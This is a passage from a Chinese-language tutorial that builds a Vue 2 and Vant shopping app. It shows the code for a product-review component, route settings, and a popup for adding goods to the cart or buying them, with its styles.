#808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">getGoodsCommentDetail</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/api/goodsDetail"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"GoodsEvaluation"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">computed:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">detailId</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$route</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">params</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">try</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">goodsId</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detailId</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">commentRes</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getGoodsCommentDetail</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">scoreType:</span><span style="color: #D4D4D4"> -</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 全部评价</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsCommentArray</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">commentRes</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsCommentArray</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">catch</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">error</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Failed to fetch goods comments:"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 可以在这里添加更多的错误处理逻辑，比如显示错误提示</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">defaultAvatar:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"https://.../coding/202408301648039.png"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">goodsCommentArray:</span><span style="color: #D4D4D4"> [], </span><span style="color: #6A9955">// 商品评价</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.goodsEvaluation</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#f7f7f7</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">min-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100vh</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  ::</span><span style="color: #569CD6">v-deep</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.van-icon-arrow-left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.comment-list</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">15px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.comment-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">8px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">15px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">box-shadow</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">2px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">8px</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">rgba</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0.05</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">22px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.top</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">50%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">object-fit</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">cover</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#eaeaea</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.name</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">font-weight</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">600</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">flex-grow</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.van-rate</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">margin-left</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">auto</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.content</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#555</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">white-space</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">normal</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">word-wrap</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">break-word</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.time</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#999</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">right</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>并转到 router 包下修改路由：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 配置动态商品id，用于确认将来是哪个商品详情页</span></span><span class="line"><span style="color: #D4D4D4">{ </span><span style="color: #C8C8C8">path</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'/productdetail/:id'</span><span style="color: #D4D4D4">, </span><span style="color: #C8C8C8">component</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">ProductDetail</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">{ </span><span style="color: #C8C8C8">path</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'/evaluation/:id'</span><span style="color: #D4D4D4">, </span><span style="color: #C8C8C8">component</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">GoodsEvaluation</span><span style="color: #D4D4D4"> },</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 404页面，用于调试</span></span><span class="line"><span style="color: #D4D4D4">{ </span><span style="color: #C8C8C8">path</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'*'</span><span style="color: #D4D4D4">, </span><span style="color: #C8C8C8">component</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">NotFound</span><span style="color: #D4D4D4"> }</span></span></code></pre></div></div></figure><h2 id="加入购物车购买"><a class="markdownIt-Anchor" href="#加入购物车购买"></a> 加入购物车 / 购买</h2><p>该功能使用到弹层组件，可以在 vant 组件库中找到 ActionSheet</p><p>页面代码如下：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">&lt;!-- 弹层 --&gt;</span></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-action-sheet</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">v-model</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">showPannel</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">  :</span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">mode</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">'cart'</span><span style="color: #D4D4D4"> ? </span><span style="color: #CE9178">'加入购物车'</span><span style="color: #D4D4D4"> : </span><span style="color: #CE9178">'立刻购买'</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;div class="product"&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;div class="product-title"&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;div class="left"&gt;</span></span><span class="line"><span style="color: #D4D4D4">            &lt;img :src="goodsDetailObj.goods_image" alt=""&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;div class="right"&gt;</span></span><span class="line"><span style="color: #D4D4D4">            &lt;div class="price"&gt;</span></span><span class="line"><span style="color: #D4D4D4">              &lt;span&gt;¥&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">              &lt;span class="nowprice"&gt;{{ goodsDetailObj.goods_price_min }}&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">            &lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">            &lt;div class="count"&gt;</span></span><span class="line"><span style="color: #D4D4D4">              &lt;span&gt;库存&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">              &lt;span&gt;{{ goodsDetailObj.stock_total }}&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">            &lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;div class="num-box"&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;span&gt;数量&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">          数字框占位</span></span><span class="line"><span style="color: #D4D4D4">        &lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;!-- 有库存才显示可购买 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;div class="showbtn" v-if="goodsDetailObj.stock_total &gt; 0"&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;div class="btn" v-if="true"&gt;加入购物车&lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;div class="btn now" v-else&gt;立刻购买&lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;div class="btn-none" v-else&gt;该商品已抢完&lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-action-sheet</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>样式如下：</p><figure class="shiki less"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 弹层样式</span></span><span class="line"><span style="color: #D7BA7D">.product</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.product-title</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">90px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">90px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.right</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.price</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fe560a</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #D7BA7D">.nowprice</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">24px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.num-box</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.btn</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.btn-none</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">rgb</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">255</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">255</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">255</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">rgb</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">255</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">148</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.btn.now</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fe5630</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.btn-none</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#cccccc</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>data 中提供两个数据：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C8C8C8">showPannel</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #C8C8C8">mode</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'cart'</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 购物车或立即购买</span></span></code></pre></div></div></figure><p>methods 中提供两个方法：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">addToCart</span><span style="color: 